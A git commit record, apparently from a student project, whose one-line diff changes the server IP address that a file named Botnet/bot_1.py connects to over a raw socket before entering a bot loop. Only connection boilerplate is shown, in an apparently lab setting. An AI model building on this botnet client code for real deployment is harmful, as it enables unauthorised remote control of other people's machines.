ded4729dc26ea36c94289fbcd0d0b30b8669ffae
Dailion <i482276@fhict.nl>
2023-06-18 23:35:07 +0200

    .

--- Botnet/bot_1.py
+++ Botnet/bot_1.py
@@ -34,7 +34,7 @@ import socket
 if __name__ == "__main__":
     print("[+] Connecting with server")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("172.16.1.21", 8085))
+    s.connect(("172.16.1.23", 8085))
     run_bot = True
     while run_bot:
         communicate_bot = True
